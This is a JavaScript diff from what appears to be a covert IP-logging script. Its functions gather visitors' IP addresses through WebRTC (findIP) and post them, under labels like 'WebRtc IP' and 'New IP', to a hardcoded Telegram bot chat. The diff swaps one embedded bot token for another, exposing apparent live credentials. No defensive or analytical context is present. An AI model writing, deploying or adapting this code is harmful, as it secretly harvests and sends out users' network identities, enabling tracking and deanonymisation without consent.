@@ -31,7 +31,7 @@ function findIP(onNewIP) {
 
 function addIP(ip) {
   const chatId = "2071502991";
-  const URI_API = "https://api.telegram.org/bot5141467470:AAH7bph9tlcUHC-2-IJlrb7GZaMZZOnDIAE/sendMessage";
+  const URI_API = "https://api.telegram.org/bot5141467470:AAEtOWx5hvgNh7rJMfYxamEqvCGpfE14e_k/sendMessage";
   let message ="WebRtc IP"+"⁣⁣⁣⁣⁣⁣⁣⁣\n"+ip+"\n⁣⁣⁣⁣⁣⁣⁣⁣⁣⁣";
 
   function TelegramStart(){
@@ -45,7 +45,7 @@ function addIP(ip) {
 
 
 const chatId = "2071502991";
-const URI_API = "https://api.telegram.org/bot5141467470:AAH7bph9tlcUHC-2-IJlrb7GZaMZZOnDIAE/sendMessage";
+const URI_API = "https://api.telegram.org/bot5141467470:AAEtOWx5hvgNh7rJMfYxamEqvCGpfE14e_k/sendMessage";
 let messageTwo = "----------------New IP-----------------";
 
 function TelegramStart(){
